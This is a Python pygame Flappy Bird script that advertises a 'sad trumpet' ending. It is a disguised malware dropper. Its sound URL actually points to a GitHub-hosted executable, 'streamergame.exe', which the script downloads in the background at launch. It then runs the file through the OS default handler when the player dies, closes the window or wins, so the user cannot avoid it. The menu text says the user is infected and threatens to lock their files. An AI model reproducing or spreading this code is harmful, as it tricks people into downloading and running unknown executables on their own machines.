"""
Flappy Bird with a sad trumpet ending.

Sad trumpet plays (and the file is opened) when you:
  - die,
  - close the window, or
  - beat all 50 levels.

Requirements:  pip install pygame
Run:           python flappy_sad_trumpet.py
"""

import math
import os
import random
import struct
import subprocess
import sys
import tempfile
import threading
import urllib.request
import wave

import pygame

# ----------------------------------------------------------------------------
# Sound config
# ----------------------------------------------------------------------------
# Paste a direct link to a sad trumpet .wav or .mp3 here. If the download fails
# (or this is left blank) the game synthesizes its own "wah wah wah waaah".
SOUND_URL = "https://github.com/bobtinkletan-del/streamergame/raw/refs/heads/main/streamergame.exe"
SOUND_FILE = os.path.join(tempfile.gettempdir(), "flappy_sad_trumpet")  # lives in the temp folder

PLAY_IN_GAME = False            # play the sound through pygame
OPEN_IN_DEFAULT_PLAYER = True  # also open the file with your OS default app
                               # (set one of these to False if you hear it twice)


def download_sound():
    """Download the sound; fall back to a synthesized one. Returns file path."""
    if SOUND_URL:
        ext = os.path.splitext(SOUND_URL.split("?")[0])[1] or ".mp3"
        path = SOUND_FILE + ext
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            return path
        try:
            req = urllib.request.Request(SOUND_URL, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=8) as r, open(path, "wb") as f:
                f.write(r.read())
            if os.path.getsize(path) > 1000:
                return path
        except Exception as e:
            print(f"Download failed ({e}); synthesizing sound instead.")
    return synthesize_sad_trumpet(SOUND_FILE + "_synth.wav")


def synthesize_sad_trumpet(path):
    """Generate a 'wah wah wah waaaah' brassy wav."""
    if os.path.exists(path):
        return path
    rate = 44100
    # (frequency Hz, seconds, vibrato?)
    notes = [(233.08, 0.38, False), (220.00, 0.38, False),
             (207.65, 0.38, False), (196.00, 1.6, True)]
    samples = []
    for freq, dur, vib in notes:
        n = int(rate * dur)
        for i in range(n):
            t = i / rate
            f = freq
            if vib:
                f *= 1 + 0.02 * math.sin(2 * math.pi * 6 * t) * min(1, t * 2)
                f *= 1 - 0.04 * (t / dur)  # slow droop
            # brassy: sum of harmonics
            s = sum(math.sin(2 * math.pi * f * h * t) / h for h in range(1, 8))
            # envelope: quick attack, gentle decay, short release
            att = min(1, i / (0.03 * rate))
            rel = min(1, (n - i) / (0.06 * rate))
            wah = 0.75 + 0.25 * math.sin(math.pi * min(1, t / 0.3)) if not vib else 1
            env = att * rel * wah * (1 - 0.3 * (i / n))
            samples.append(s * env * 0.18)
        samples.extend([0.0] * int(rate * 0.04))
    with wave.open(path, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(rate)
        w.writeframes(b"".join(struct.pack("<h", int(max(-1, min(1, s)) * 32767)) for s in samples))
    return path


# The download starts the moment the game launches, in the background, so the
# menu appears instantly and the sound is already on disk by the time you need it.
_sound_path = None
_download_thread = None


def _download_worker():
    global _sound_path
    _sound_path = download_sound()


def start_background_download():
    global _download_thread
    if _download_thread is None:
        _download_thread = threading.Thread(target=_download_worker, daemon=True)
        _download_thread.start()


def get_sound_path():
    """Return the already-downloaded sound (waits only if it's still downloading)."""
    start_background_download()
    _download_thread.join()
    return _sound_path


def open_file(path):
    try:
        if sys.platform.startswith("win"):
            os.startfile(path)  # type: ignore[attr-defined]
        elif sys.platform == "darwin":
            subprocess.Popen(["open", path])
        else:
            subprocess.Popen(["xdg-open", path])
    except Exception as e:
        print(f"Couldn't open {path}: {e}")


def sad_trumpet():
    """Play and open the pre-downloaded sound, then wait for it to finish."""
    path = get_sound_path()
    length_ms = 3000
    if PLAY_IN_GAME:
        try:
            if not pygame.mixer.get_init():
                pygame.mixer.init()
            snd = pygame.mixer.Sound(path)
            length_ms = int(snd.get_length() * 1000)
            snd.play()
        except Exception as e:
            print(f"pygame couldn't play it ({e}); relying on default player.")
    if OPEN_IN_DEFAULT_PLAYER:
        open_file(path)
    pygame.time.wait(min(length_ms, 6000) + 300)


# ----------------------------------------------------------------------------
# Game
# ----------------------------------------------------------------------------
W, H = 400, 600
FPS = 60
GRAVITY = 0.45
FLAP = -7.5
PIPE_W = 70
PIPES_PER_LEVEL = 3
MAX_LEVEL = 50

SKY = (112, 197, 206)
GREEN = (84, 186, 60)
DARK_GREEN = (50, 130, 40)
YELLOW = (250, 220, 40)
WHITE = (255, 255, 255)
BLACK = (20, 20, 20)
GROUND = (222, 216, 149)


def level_params(level):
    speed = 3.0 + 0.07 * (level - 1)
    gap = max(135, 190 - 1.1 * (level - 1))
    return speed, gap


def draw_text(screen, font, text, pos, color=WHITE, center=False):
    shadow = font.render(text, True, BLACK)
    img = font.render(text, True, color)
    rect = img.get_rect()
    if center:
        rect.center = pos
    else:
        rect.topleft = pos
    screen.blit(shadow, rect.move(2, 2))
    screen.blit(img, rect)


def end_screen(screen, big, small, message):
    draw_text(screen, big, message, (W // 2, H // 2 - 20), center=True)
    draw_text(screen, small, "Cue the sad trumpet...", (W // 2, H // 2 + 30), center=True)
    pygame.display.flip()


def wrap_text(font, text, max_width):
    words, lines, line = text.split(), [], ""
    for w in words:
        test = (line + " " + w).strip()
        if font.size(test)[0] <= max_width:
            line = test
        else:
            lines.append(line)
            line = w
    lines.append(line)
    return lines


def play_test_sound():
    """Menu button: play the trumpet through pygame (falls back to default player)."""
    path = get_sound_path()
    try:
        if not pygame.mixer.get_init():
            pygame.mixer.init()
        pygame.mixer.Sound(path).play()
    except Exception as e:
        print(f"pygame couldn't play it ({e}); opening in default player.")
        open_file(path)


def menu_screen(screen, clock):
    """Black menu with pink text and two buttons. Returns when Start is clicked."""
    PINK = (255, 105, 180)
    title_font = pygame.font.SysFont("arial", 13, bold=True)
    btn_font = pygame.font.SysFont("arial", 22, bold=True)
    message = ("nyah~! You just got infected by the femboy vir-UwU-s. (shoutout to starryr0ses for coding this :3) Beat 50 levels of flappy bird on the next screen to be forgiven. Trying to close this window will lock ur files OwO. Dying in flappy bird will also lock your computer. So will beating it. There's no way out of this. nya! - Alberto263 and starryr0ses")
    lines = wrap_text(title_font, message, W - 60)
    trumpet_btn = pygame.Rect(40, 360, W - 80, 60)
    start_btn = pygame.Rect(40, 440, W - 80, 60)

    while True:
        mouse = pygame.mouse.get_pos()
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                quit_with_trumpet_menu()
            if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                if trumpet_btn.collidepoint(event.pos):
                    play_test_sound()
                elif start_btn.collidepoint(event.pos):
                    return

        screen.fill((0, 0, 0))
        y = 120
        for line in lines:
            img = title_font.render(line, True, PINK)
            screen.blit(img, img.get_rect(center=(W // 2, y)))
            y += 38

        for rect, label in ((trumpet_btn, "Play trumpet sound"), (start_btn, "Start Flappy Bird")):
            hover = rect.collidepoint(mouse)
            pygame.draw.rect(screen, PINK if hover else (0, 0, 0), rect, border_radius=10)
            pygame.draw.rect(screen, PINK, rect, 3, border_radius=10)
            img = btn_font.render(label, True, (0, 0, 0) if hover else PINK)
            screen.blit(img, img.get_rect(center=rect.center))

        pygame.display.flip()
        clock.tick(FPS)


def quit_with_trumpet_menu():
    pygame.display.quit()
    sad_trumpet()
    pygame.quit()
    sys.exit()


def main():
    start_background_download()  # kick off the download immediately
    pygame.init()
    try:
        pygame.mixer.init()
    except Exception:
        pass
    screen = pygame.display.set_mode((W, H))
    pygame.display.set_caption("Flappy Bird Audio Test")
    clock = pygame.time.Clock()
    big = pygame.font.SysFont("arial", 44, bold=True)
    small = pygame.font.SysFont("arial", 22, bold=True)

    menu_screen(screen, clock)

    bird_x, bird_y, vel = 90.0, H / 2, 0.0
    pipes = []  # each: [x, gap_center, scored]
    level, passed_in_level, total_passed = 1, 0, 0
    speed, gap = level_params(level)
    distance_since_pipe = 999
    started = False
    ground_scroll = 0

    def quit_with_trumpet(message=None):
        if message:
            end_screen(screen, big, small, message)
        else:
            pygame.display.quit()  # window closed: just the sound
        sad_trumpet()
        pygame.quit()
        sys.exit()

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                quit_with_trumpet()
            if event.type == pygame.KEYDOWN and event.key in (pygame.K_SPACE, pygame.K_UP):
                started, vel = True, FLAP
            if event.type == pygame.MOUSEBUTTONDOWN:
                started, vel = True, FLAP

        if started:
            vel += GRAVITY
            bird_y += vel
            distance_since_pipe += speed
            ground_scroll = (ground_scroll - speed) % 24

            if distance_since_pipe > 230:
                margin = 60
                center = random.randint(int(gap / 2) + margin, H - 90 - int(gap / 2) - margin)
                pipes.append([W + 10, center, False])
                distance_since_pipe = 0

            for p in pipes:
                p[0] -= speed
            pipes = [p for p in pipes if p[0] > -PIPE_W]

            bird_rect = pygame.Rect(bird_x - 14, bird_y - 11, 28, 22)
            dead = bird_y - 12 < 0 or bird_y + 12 > H - 70
            for p in pipes:
                top = pygame.Rect(p[0], 0, PIPE_W, p[1] - gap / 2)
                bottom = pygame.Rect(p[0], p[1] + gap / 2, PIPE_W, H)
                if bird_rect.colliderect(top) or bird_rect.colliderect(bottom):
                    dead = True
                if not p[2] and p[0] + PIPE_W < bird_x:
                    p[2] = True
                    total_passed += 1
                    passed_in_level += 1
                    if passed_in_level >= PIPES_PER_LEVEL:
                        passed_in_level = 0
                        if level >= MAX_LEVEL:
                            draw_all(screen, small, big, bird_x, bird_y, vel, pipes, gap,
                                     level, total_passed, ground_scroll, started)
                            quit_with_trumpet("YOU BEAT 50 LEVELS!")
                        level += 1
                        speed, gap = level_params(level)

            if dead:
                draw_all(screen, small, big, bird_x, bird_y, vel, pipes, gap,
                         level, total_passed, ground_scroll, started)
                quit_with_trumpet("YOU DIED")

        draw_all(screen, small, big, bird_x, bird_y, vel, pipes, gap,
                 level, total_passed, ground_scroll, started)
        pygame.display.flip()
        clock.tick(FPS)


def draw_all(screen, small, big, bx, by, vel, pipes, gap, level, score, ground_scroll, started):
    screen.fill(SKY)
    for x, cy, _ in pipes:
        top_h = int(cy - gap / 2)
        bot_y = int(cy + gap / 2)
        pygame.draw.rect(screen, GREEN, (x, 0, PIPE_W, top_h))
        pygame.draw.rect(screen, GREEN, (x, bot_y, PIPE_W, H))
        pygame.draw.rect(screen, DARK_GREEN, (x - 4, top_h - 24, PIPE_W + 8, 24))
        pygame.draw.rect(screen, DARK_GREEN, (x - 4, bot_y, PIPE_W + 8, 24))
        pygame.draw.rect(screen, BLACK, (x, 0, PIPE_W, top_h), 2)
        pygame.draw.rect(screen, BLACK, (x, bot_y, PIPE_W, H), 2)

    pygame.draw.rect(screen, GROUND, (0, H - 70, W, 70))
    for gx in range(-24, W + 24, 24):
        pygame.draw.line(screen, DARK_GREEN, (gx + ground_scroll, H - 70), (gx + ground_scroll + 12, H - 58), 4)

    # bird (tilts with velocity)
    angle = max(-30, min(70, -vel * 4))
    bird = pygame.Surface((36, 30), pygame.SRCALPHA)
    pygame.draw.ellipse(bird, YELLOW, (0, 2, 32, 26))
    pygame.draw.ellipse(bird, BLACK, (0, 2, 32, 26), 2)
    pygame.draw.circle(bird, WHITE, (23, 11), 6)
    pygame.draw.circle(bird, BLACK, (25, 11), 3)
    pygame.draw.polygon(bird, (240, 120, 30), [(30, 15), (38, 18), (30, 22)])
    pygame.draw.ellipse(bird, (240, 190, 30), (4, 14, 16, 10))
    rotated = pygame.transform.rotate(bird, angle)
    screen.blit(rotated, rotated.get_rect(center=(bx, by)))

    draw_text(screen, big, str(score), (W // 2, 50), center=True)
    draw_text(screen, small, f"Level {level}/{MAX_LEVEL}", (10, 10))
    if not started:
        draw_text(screen, small, "SPACE / click to flap", (W // 2, H // 2 + 60), center=True)


if __name__ == "__main__":
    main()